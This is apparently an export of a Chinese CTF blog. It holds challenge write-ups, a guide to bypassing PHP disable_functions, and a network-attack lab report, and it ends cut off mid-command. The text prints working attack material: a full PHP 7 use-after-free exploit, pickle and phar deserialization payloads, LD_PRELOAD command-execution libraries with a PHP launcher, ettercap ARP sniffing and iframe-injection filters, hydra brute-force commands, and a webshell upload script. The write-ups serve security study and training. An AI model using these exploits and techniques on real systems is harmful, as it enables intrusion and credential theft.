id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h2><p>分析</p><p>考点是pickle反序列化，过滤掉了  R 指令码，并且重写了 <code>find_class</code>：</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module == &#39;__main__&#39;:            return getattr(sys.modules[&#39;__main__&#39;], name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))</code></pre><p>这就禁止引用除了 <code>__main__</code> 之外的其他module，但是如果通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改</p><p>于是可以先引入 <code>__main__.secret</code> 这个module，然后把一个 dict 压入栈，内容是 <code>{&#39;name&#39;: &#39;xx&#39;, &#39;category&#39;: &#39;yyy&#39;}</code>,之后执行 build指令，改写 <code>__main__.secret.name</code> 和 <code>__main__.secret.category</code>,此时 <code>secret.name</code>和 <code>secret.category</code> 已经变成我们想要的内容</p><p>之后再压入一个正常的 Animal对象，name和category分别是 xx和yyy最后构造的pickle数据如下</p><pre><code>b&quot;\x80\x03c__main__\nsecret\n}(Vname\nVxx\nVcategory\nVyyy\nub0c__main__\nAnimal\n)\x81}(S&#39;name&#39;\nS&#39;xx&#39;\nS&#39;category&#39;\nS&#39;yyy&#39;\nub.&quot;</code></pre><p>编码为base64提交即可</p><pre><code>gANjX19tYWluX18Kc2VjcmV0Cn0oVm5hbWUKVnh4ClZjYXRlZ29yeQpWeXl5CnViMGNfX21haW5fXwpBbmltYWwKKYF9KFMnbmFtZScKUyd4eCcKUydjYXRlZ29yeScKUyd5eXknCnViLg==</code></pre><h2 id="php-uaf"><a href="#php-uaf" class="headerlink" title="php-uaf"></a>php-uaf</h2><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener">脚本</a></p><pre><code class="php">rddshell&lt;?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1pwn(&#39;/readflag&#39;);function pwn($cmd) {    global $abc, $helper, $backtrace;    class Vuln {        public $a;        public function __destruct() {             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace(); # ;)            if(!isset($backtrace[1][&#39;args&#39;])) { # PHP &gt;= 7.4                $backtrace = debug_backtrace();            }        }    }    class Helper {        public $a, $b, $c, $d;    }    function str2ptr(&amp;$str, $p = 0, $s = 8) {        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) {            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        }        return $address;    }    function ptr2str($ptr, $m = 8) {        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) {            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        }        return $out;    }    function write(&amp;$str, $p, $v, $n = 8) {        $i = 0;        for($i = 0; $i &lt; $n; $i++) {            $str[$p + $i] = chr($v &amp; 0xff);            $v &gt;&gt;= 8;        }    }    function leak($addr, $p = 0, $s = 8) {        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }        return $leak;    }    function parse_elf($base) {        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) {            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write                # handle pie                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec                $text_size = $p_memsz;            }        }        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    }    function get_basic_funcs($base, $elf) {        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) {            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {                $deref = leak($leak);                # &#39;constant&#39; constant check                if($deref != 0x746e6174736e6f63)                    continue;            } else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {                $deref = leak($leak);                # &#39;bin2hex&#39; constant check                if($deref != 0x786568326e6962)                    continue;            } else continue;            return $data_addr + $i * 8;        }    }    function get_binary_base($binary_leak) {        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) {            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) { # ELF header                return $addr;            }        }    }    function get_system($basic_funcs) {        $addr = $basic_funcs;        do {            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) { # system                return leak($addr + 8);            }            $addr += 0x20;        } while($f_entry != 0);        return false;    }    function trigger_uaf($arg) {        # str_shuffle prevents opcache string interning        $arg = str_shuffle(str_repeat(&#39;A&#39;, 79));        $vuln = new Vuln();        $vuln-&gt;a = $arg;    }    if(stristr(PHP_OS, &#39;WIN&#39;)) {        die(&#39;This PoC is for *nix systems only.&#39;);    }    $n_alloc = 10; # increase this value if UAF fails    $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(str_repeat(&#39;A&#39;, 79));    trigger_uaf(&#39;x&#39;);    $abc = $backtrace[1][&#39;args&#39;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) { };    if(strlen($abc) == 79 || strlen($abc) == 0) {        die(&quot;UAF failed&quot;);    }    # leaks    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) {        die(&quot;Couldn&#39;t determine binary base address&quot;);    }    if(!($elf = parse_elf($base))) {        die(&quot;Couldn&#39;t parse ELF header&quot;);    }    if(!($basic_funcs = get_basic_funcs($base, $elf))) {        die(&quot;Couldn&#39;t get basic_functions address&quot;);    }    if(!($zif_system = get_system($basic_funcs))) {        die(&quot;Couldn&#39;t get zif_system address&quot;);    }    # fake closure object    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) {        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    }    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper-&gt;b)($cmd);    exit();}</code></pre><p>上传到tmp目录就行了</p><p><img src="/posts/2f3193b1/1583803771844.png" alt></p><h2 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h2><p><code>www.zip</code> 源码泄露(现在好多web题都喜欢这么搞了)</p><p>这题主要是对伪造mysql的考察，但是有一个坑点</p><p><img src="/posts/2f3193b1/1583812041964.png" alt></p><p>我们可以设置<code>option</code>为8，然后就启用<code>MYSQL_OPT_LOCAL_INFILE</code>了。</p><p><img src="/posts/2f3193b1/1583812118883.png" alt></p><p>之后构造一个POP链就行了，POP链不是很长</p><pre><code class="php">&lt;?phpclass Listfile{    public $file;    function __construct()    {        $this-&gt;file = &quot;;/readflag&quot;;    }}class Fileupload{    public $file;    function __construct()    {        $this-&gt;file = new Listfile();    }}$payload = new Fileupload();$exp = new Phar(&#39;yds.phar&#39;);$exp -&gt; startBuffering();$exp-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;);$exp -&gt; addFromString(&#39;test.txt&#39;,&#39;test&#39;);$exp -&gt; setMetadata($payload);$exp -&gt; stopBuffering();</code></pre><p><img src="/posts/2f3193b1/0.png" alt></p><h2 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h2><p>这题估计是很多队伍都比较头疼的了，3月7日那天折腾了一下午直到晚上才有师傅做出来</p><p>源代码</p><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;head&#39;])&amp;&amp;isset($_GET[&#39;url&#39;])){    $begin = &quot;The number you want: &quot;;    extract($_GET);    if($head == &#39;&#39;){        die(&#39;Where is your head?&#39;);    }    if(preg_match(&#39;/[A-Za-z0-9]/i&#39;,$head)){        die(&#39;Head can\&#39;t be like this!&#39;);    }    if(preg_match(&#39;/log/i&#39;,$url)){        die(&#39;No No No&#39;);    }    if(preg_match(&#39;/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i&#39;,$url)){        die(&#39;Don\&#39;t use strange protocol!&#39;);    }    $funcname = $head.&#39;curl_init&#39;;    $ch = $funcname();    if($ch){        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output = curl_exec($ch);        curl_close($ch);    }    else{        $output = &#39;rua&#39;;    }    echo sprintf($begin.&#39;%d&#39;,$output);}else{    show_source(__FILE__);}</code></pre><p>几个小trick</p><ul><li><code>$head = \</code> 这样拼接之后就是根命名空间</li><li>协议基本都被过滤干净了就只能用http协议</li><li><code>$begin= %s%</code></li><li>过滤了 <code>log</code>，我估计是出题人不想让你去读日志(因为后面发现可以读除了flag之外的任意文件)</li></ul><p>之后就扫内网，看到开放了8080端口</p><p><img src="/posts/2f3193b1/1583812423811.png" alt></p><p>这里的坑点就比较多了，首先需要知道vipcode</p><pre><code>?head=\&amp;url=http://127.0.0.1:8080/read/file={file.vip.__dict__}%26vipcode=0&amp;begin=%s%</code></pre><p><img src="/posts/2f3193b1/1583812448622.png" alt></p><p>然后读文件</p><pre><code>/?head=\&amp;url=http://127.0.0.1:8080/read/file=/app/base/vip.py%26vipcode=m3O5PGEBMnbX0N8ugWlIoijtFaS9KsqVAQdvZyT1cheCxpwf&amp;begin=%s%</code></pre><p><img src="/posts/2f3193b1/1583812465323.png" alt></p><p><code>vip.py</code> </p><pre><code class="python">Welcome,dear vip! Here are what you want:The file you read is:/app/base/vip.pyThe content is:import randomimport stringvipcode = &#39;&#39;class vip:    def __init__(self):        global vipcode        if vipcode == &#39;&#39;:            vipcode = &#39;&#39;.join(random.sample(string.ascii_letters+string.digits, 48))            self.truevipcode = vipcode        else:            self.truevipcode = vipcode    def GetCode(self):        return self.truevipcodeOther files under the same folder:__pycache__ __init__.py vip.py readfile.py%d</code></pre><p><code>readfile.py</code></p><pre><code class="python">from .vip import vipimport reimport osclass File:    def __init__(self,file):        self.file = file    def __str__(self):        return self.file    def GetName(self):        return self.fileclass readfile():    def __str__(self):        filename = self.GetFileName()        if &#39;..&#39; in filename or &#39;proc&#39; in filename:            return &quot;quanbumuda&quot;        else:            try:                file = open(&quot;/tmp/&quot; + filename, &#39;r&#39;)                content = file.read()                file.close()                return content            except:                return &quot;error&quot;    def __init__(self, data):        if re.match(r&#39;file=.*?&amp;vipcode=.*?&#39;,data) != None:            data = data.split(&#39;&amp;&#39;)            data = {                data[0].split(&#39;=&#39;)[0]: data[0].split(&#39;=&#39;)[1],                data[1].split(&#39;=&#39;)[0]: data[1].split(&#39;=&#39;)[1]            }            if &#39;file&#39; in data.keys():                self.file = File(data[&#39;file&#39;])            if &#39;vipcode&#39; in data.keys():                self.vipcode = data[&#39;vipcode&#39;]            self.vip = vip()    def test(self):        if &#39;file&#39; not in dir(self) or &#39;vipcode&#39; not in dir(self) or &#39;vip&#39; not in dir(self):            return False        else:            return True    def isvip(self):        if self.vipcode == self.vip.GetCode():            return True        else:            return False    def GetFileName(self):        return self.file.GetName()current_folder_file = []class vipreadfile():    def __init__(self,readfile):        self.filename = readfile.GetFileName()        self.path = os.path.dirname(os.path.abspath(self.filename))        self.file = File(os.path.basename(os.path.abspath(self.filename)))        global current_folder_file        try:            current_folder_file = os.listdir(self.path)        except:            current_folder_file = current_folder_file    def __str__(self):        if &#39;fl4g&#39; in self.path:            return &#39;nonono,this folder is a secret!!!&#39;        else:            output = &#39;&#39;&#39;Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n&#39;&#39;&#39;            filepath = (self.path + &#39;/{vipfile}&#39;).format(vipfile=self.file)            output += filepath            output += &#39;\r\n\r\nThe content is:\r\n&#39;            try:                f = open(filepath,&#39;r&#39;)                content = f.read()                f.close()            except:                content = &#39;can\&#39;t read&#39;            output += content            output += &#39;\r\n\r\nOther files under the same folder:\r\n&#39;            output += &#39; &#39;.join(current_folder_file)            return output</code></pre><p>过滤掉了 <code>fl4g</code></p><p><img src="/posts/2f3193b1/0-1583812648124.png" alt></p><p>看到 <code>current_folder_file</code> 是 global 的</p><p>所以读一次根目录的文件，让<code>current_folder_file</code> 里面有 <code>fl4g</code></p><p><img src="/posts/2f3193b1/0-1583812681289.png" alt></p><pre><code>/?head=\&amp;url=http://localhost:8080/read/file=/{vipfile.__class__.GetName.__globals__[current_folder_file][21]}/flag%26vipcode=m3O5PGEBMnbX0N8ugWlIoijtFaS9KsqVAQdvZyT1cheCxpwf&amp;begin=%s%</code></pre><p>或者这个</p><pre><code>http://121.37.179.47:1101/?head=\&amp;begin=%1$s&amp;url=http://127.0.0.1:8080/read/file={vipfile.__class__.__init__.__globals__[__name__][9]}l4g_1s_h3re_u_wi11_rua/flag%26vipcode=kWSRgrZO9VjAJzaHsIwqXEtfF5u6GxM0ov74le18hcNnUpd3</code></pre><h2 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h2><p>false注入</p><p><code>username=&#39;%&#39;1&amp;password=&#39;%&#39;1</code></p><p>即可</p><h2 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h2><h2 id="happyvacation"><a href="#happyvacation" class="headerlink" title="happyvacation"></a>happyvacation</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行进阶</title>
      <link href="/posts/137d2c1/"/>
      <url>/posts/137d2c1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>绕过disable_function总结</title>
      <link href="/posts/1cc6bf70/"/>
      <url>/posts/1cc6bf70/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>有一部分CTF题目，当你拿到webshell，蚁剑连接上去之后，却不能执行系统命令，这就是要绕过 <code>disable_function</code> 了</p><p><img src="/posts/1cc6bf70/1583650697704.png" alt="、"></p><p>可以看到禁用了很多函数</p><pre><code>apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system</code></pre><h2 id="LD-PRELOAD-劫持系统函数"><a href="#LD-PRELOAD-劫持系统函数" class="headerlink" title="LD_PRELOAD 劫持系统函数"></a>LD_PRELOAD 劫持系统函数</h2><blockquote><p>LD_PRELOAD 是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。</p></blockquote><p>所以我们就可以通过利用环境变量LD_PRELOAD劫持系统函数，让外部程序加载恶意的.so文件，达到执行系统命令的效果</p><p>例如：</p><pre><code>$ LD_PRELOAD=/path/to/my/malloc.so /bin/ls</code></pre><p>即在执行<code>ls</code>命令前，会先加载指定路径的<code>malloc.so</code>文件，如果这是一个恶意共享对象，那么可以执行任意操作。</p><p>我们可以通过<code>readelf</code>命令查看某个命令调用了哪些外部链接库，然后找到其中某个库，编写同名函数进行劫持，然后编译成共享对象文件，接着使用<code>LD_PRELOAD</code>环境变量指定生成的对象，达到命令执行的目的。</p><h3 id="一个简单的劫持示例"><a href="#一个简单的劫持示例" class="headerlink" title="一个简单的劫持示例"></a>一个简单的劫持示例</h3><p><code>getpid.c</code> 的内容如下</p><pre><code class="C">#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;void payload(void){    system(&quot;echo &#39;pwned by getpid!&#39;&quot;);}pid_t getpid(void){    if (getenv(&quot;LD_PRELOAD&quot;) == NULL){        return 0;    }    unsetenv(&quot;LD_PRELOAD&quot;);    payload();    return 0;}</code></pre><p>我们在这里劫持了 <code>getpid</code> 函数，由于python运行的时候使用了 <code>getpid</code> 函数，所以可以通过 <code>LD_PRELODAD</code> 来执行任意命令</p><pre><code>gcc -shared -fPIC getpid.c -o getpid.soLD_PRELOAD=./getpid.so python</code></pre><p>执行效果</p><p><img src="/posts/1cc6bf70/1583651075354.png" alt></p><p>注意：因为通过设置<code>preload</code>劫持了比较底层的函数，而派发出的新进程如果用到该函数也会一并被劫持，也就是说如果没有及时<code>unsetenv(&quot;LD_PRELOAD&quot;)</code>则会导致不断循环，一旦操作敏感就会比较危险，所以一定要及时删除这个环境变量，</p><p>所以绕过php disable_function也就比较简单了</p><blockquote><p>php中的mail、error_log函数是通过调用系统中的sendmail命令实现的(其他类似php中的函数还有imap_mail、mb_send_mail<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">参考</a>)，sendmail二进制文件中使用了getuid库函数，这样我们可以覆盖getuid函数。</p></blockquote><p>写一个 <code>getuid</code> </p><pre><code class="C">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int  getuid() {const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }unsetenv(&quot;LD_PRELOAD&quot;);system(cmdline);}</code></pre><p><code>gcc -shared -fPIC geteuid.c -o getuid.so</code> 编译成动态链接库。</p><p>然后再写一个php文件，设置好 <code>EVIL_CMDLINE</code> 环境变量，同时需要执行 so 文件地址</p><pre><code class="php">&lt;?php    $cmd = $_REQUEST[&quot;cmd&quot;];    $out_path = $_REQUEST[&quot;outpath&quot;];    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);    $so_path = $_REQUEST[&quot;sopath&quot;];    putenv(&quot;LD_PRELOAD=&quot; . $so_path);    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;;  ?&gt;</code></pre><h2 id="无需劫持函数绕过-disable-function"><a href="#无需劫持函数绕过-disable-function" class="headerlink" title="无需劫持函数绕过 disable_function"></a>无需劫持函数绕过 disable_function</h2><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD?files=1&tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">下载地址</a></p><blockquote><p>GCC 有个 C 语言扩展修饰符<strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行<strong>attribute</strong>((constructor)) 修饰的函数。</p></blockquote><p>于是修改一下原来的共享链接库代码</p><pre><code class="C">#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void getuid() {const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }unsetenv(&quot;LD_PRELOAD&quot;);system(cmdline);}</code></pre><blockquote><p>这意味着，我们只需要找到该php环境中存在执行系统命令的函数、且putenv函数未被禁用的情况下，就可以绕过disable_function。</p></blockquote><p>演示一下</p><pre><code class="C">#include &lt;unistd.h&gt;void payload(void){    system(&quot;echo &#39;pwned!&#39;&quot;);}__attribute__ ((__constructor__)) void exec(void){    if (getenv(&quot;LD_PRELOAD&quot;) == NULL){        return;    }    unsetenv(&quot;LD_PRELOAD&quot;);    payload();    return;}</code></pre><p><img src="/posts/1cc6bf70/1583651506472.png" alt></p><h2 id="php7绕过disable-funtion"><a href="#php7绕过disable-funtion" class="headerlink" title="php7绕过disable_funtion"></a>php7绕过disable_funtion</h2><p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">脚本地址</a></p><h2 id="ctfhub题目"><a href="#ctfhub题目" class="headerlink" title="ctfhub题目"></a>ctfhub题目</h2><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>使用蚁剑连接之后，直接加载插件，之后生成一个 <code>.antproxy.php</code> ，选择这个文件连接即可(密码不变)</p><p><img src="/posts/1cc6bf70/1583651719652.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kylingit.com/blog/利用ld_preload绕过disbale_functions/" target="_blank" rel="noopener">https://kylingit.com/blog/%E5%88%A9%E7%94%A8ld_preload%E7%BB%95%E8%BF%87disbale_functions/</a></p><p><a href="https://j7ur8.github.io/WebBook/PHP/LD_PRELOAD劫持系统函数.html" target="_blank" rel="noopener">https://j7ur8.github.io/WebBook/PHP/LD_PRELOAD%E5%8A%AB%E6%8C%81%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0.html</a></p><p><a href="https://blog.szfszf.top/article/37/" target="_blank" rel="noopener">https://blog.szfszf.top/article/37/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络侦察实验</title>
      <link href="/posts/ea51772/"/>
      <url>/posts/ea51772/</url>
      
        <content type="html"><![CDATA[<p>实验的网络拓扑结构：kali是攻击机，另外两台是靶机</p><p><img src="/posts/ea51772/1583827591679.png" alt></p><p><img src="/posts/ea51772/1583827763195.png" alt></p><h2 id="任务一-使用nmap-ettercap进行网络侦查和密码嗅探"><a href="#任务一-使用nmap-ettercap进行网络侦查和密码嗅探" class="headerlink" title="任务一  使用nmap,ettercap进行网络侦查和密码嗅探"></a>任务一  使用nmap,ettercap进行网络侦查和密码嗅探</h2><p>ettercap使用</p><p>常用参数</p><ul><li>-l 显示可用网卡</li><li>-i 选择网卡</li><li>-t 协议选择，tcp/udp/all</li><li>-p 不进行毒化攻击，只用来嗅探</li><li>-F 载入过滤器文件</li><li>-V text 将数据包以文本形式显示在屏幕上</li></ul><p><code>ettercap -Tzq</code> 以命令行显示，只嗅探本地数据包，只显示捕捉到的用户名和密码以及其他信息</p><p>具体到这个实验，需要使用ettercap去捕获ftp登陆的用户名和口令。其中，192.168.1.3 开放了ftp端口，所以尝试多次之后</p><pre><code>ettercap -i eth1 -Tq -L sniffeddata -M arp:remote //192.168.1.3/21//</code></pre><p><img src="/posts/ea51772/Image.png" alt></p><p>然后就抓到密码了</p><p><img src="/posts/ea51772/Image-1583392370959.png" alt></p><p>ettercap过滤脚本学习：</p><pre><code> if (ip.proto == TCP &amp;&amp; ip.dst != &#39;192.1.1.200&#39; &amp;&amp; tcp.dst == 80 || tcp.dst == 8080) {      #...and if it contains an Accept-Encoding header...      if (search(DATA.data, &quot;Accept-Encoding&quot;)) {      #...remove any Encoding (make sure we are using plain text)      replace(&quot;Accept-Encoding&quot;, &quot;Accept-Nothing!&quot;);        }    }    #--Inject Iframe--    if (ip.proto == TCP &amp;&amp; ip.dst != &#39;192.1.1.200&#39; &amp;&amp; tcp.src == 80 || tcp.src == 8080) {       if (search(DATA.data, &quot;&lt;body&gt;&quot;)){           #Replace it with the body tag and an iframe to our attacking webpage           replace(&quot;&lt;body&gt;&quot;,&quot;&lt;body&gt;&lt;iframe src=&#39;http://192.1.1.200&#39; width=0 height=0 /&gt;&quot;);           msg(&quot;iframe injected after &lt;body&gt;\n&quot;);       }       if (search(DATA.data, &quot;&lt;BODY&gt;&quot;)){           replace(&quot;&lt;BODY&gt;&quot;,&quot;&lt;BODY&gt;&lt;IFRAME SRC=&#39;http://192.1.1.200&#39; width=0 height=0 /&gt;&quot;);           msg(&quot;iframe injected after &lt;BODY&gt;\n&quot;);       }   }</code></pre><p>第一部分的作用是将HTTP请求头中的Accept-Encoding部分替换掉，使WebServer返回的数据是原始数据，而不是经过压缩（如gzip）后的数据，方便我们嗅探分析。第二部分的作用是查找返回数据中的<body>和<BODY>标签，并在它后面添加一个iframe标签。</BODY></body></p><p>基本语法</p><pre><code>Ettercap的过滤规则只有经过编译之后才能由-F参数载入到ettercap中使用。编译过滤规则的命令是：etterfilter filter.ecf -o filter.ef。即把filter.ecf文件编译成ettercap能识别的filter.ef文件。过滤规则的语法与C类似，但只有if语句，不支持循环语句。需要注意的地方是，if与”(”之间必须要有一个空格，且大括号{}不能省略。Ettercap提供的一些常用的函数有：search(where, what) 从字符串where中查找what，若找到则返回trueregex(where, regex) 从字符串where中匹配正则表达式regex，若找到则返回truereplace(what, with) 把字符串what替换成字符串withlog(what, where) 把字符串what记录到where文件中msg(message) 在屏幕上显示出字符串messageexit() 退出</code></pre><p>（当然这里不用这么复杂啦</p><h2 id="任务二-使用crunch，hydra暴力破解ssh服务"><a href="#任务二-使用crunch，hydra暴力破解ssh服务" class="headerlink" title="任务二 使用crunch，hydra暴力破解ssh服务"></a>任务二 使用crunch，hydra暴力破解ssh服务</h2><p>crunch的基本用法</p><p>*　　-b #体积大小，比如后跟20mib<br>*　　-c #密码个数（行数），比如8000<br>*　　-d #限制出现相同元素的个数（即至少出现元素个数），-d 3就不会出现zzf ffffgggg之类的<br>*　　-e #定义停止生成密码 ，比如-e 222222：到222222停止生成密码<br>*　　-f #调用密码库文件，比如/usr/share/crunch/charset.lst<br>*　　-i #改变输出格式<br>*　　-l #与-t搭配使用<br>*　　-m #与-p搭配使用<br>*　　-o #保存为<br>*　　-p #定义密码元素<br>*　　-q #读取字典<br>*　　-r #定义从某一个地方重新开始<br>*　　-s #第一个密码，从xxx开始<br>*　　-t #定义输出格式</p><p>hydra爆破的用法</p><ul><li>破解ssh</li></ul><p><code>hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.104 ssh</code></p><ul><li>破解ftp</li></ul><p><code>hydra ip ftp -l 用户名 -P 密码字典 -t线程(默认16) -vV</code></p><ul><li>破解rdp</li></ul><p><code>hydra ip rdp -l administrator -P pass.txt -V</code></p><ul><li>破解telnet</li></ul><p><code>hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</code></p><p>当然这里我们直接社工吧。。hacker123</p><h2 id="任务三-使用ssh登陆"><a href="#任务三-使用ssh登陆" class="headerlink" title="任务三 使用ssh登陆"></a>任务三 使用ssh登陆</h2><p>不说了。。ssh命令了解一下即可</p><h2 id="任务四-获取目标网站的webshell权限，控制目标机，获得敏感信息"><a href="#任务四-获取目标网站的webshell权限，控制目标机，获得敏感信息" class="headerlink" title="任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息"></a>任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息</h2><p>这是exponent cms的漏洞，百度就知道了</p><p><a href="https://www.anquanke.com/post/id/84514" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84514</a></p><p>简单来说就是对上传没做过滤可以任意文件上传，但是上传之后就会被删掉</p><p>(看上去挺安全的，其实23333，引狼入室犯了安全大忌)</p><p>在判断的时候，可以通过修改参数来实现绕过删除</p><p>绕过删除之后，由于文件被重命名了，所以需要爆破一下文件名，使用脚本能够比较方便的完成</p><pre><code class="python">import requestsbase_url=&#39;http://192.168.1.4/&#39;url_for_time=&#39;index.php?module=eventregistration&amp;action=eventsCalendar&#39;url_for_upload=&#39;index.php?module=eventregistration&amp;action=emailRegistrants&amp;email_addresses=123456789@123.com&amp;email_message=1&amp;email_subject=1&#39;files={&#39;attach&#39;:open(&#39;index.php&#39;,&#39;rb&#39;)}requests.post(base_url+url_for_upload,files=files)print &#39;upload finish&#39;r=requests.get(base_url+url_for_time)html1=r.content#print html1index=r.content.find(&#39;History.pushState&#39;)if index:    time=html1[index:index+60].split(&#39;rel&#39;)[1].split(&#39;\&#39;&#39;)[1]else:    print &#39;something wrong&#39;    exit(0)print &quot;get time:&quot;+ timefor i in range(int(time),int(time)-20,-1):    shell_url=base_url+&#39;tmp/&#39;+str(i)+&#39;_index.php&#39;    r2=requests.get(shell_url)    if r2.status_code==200:        print &quot;shell is here : &quot;+shell_url </code></pre><p>准备一个index.php</p><pre><code class="php">root@simpleedu:~# cat 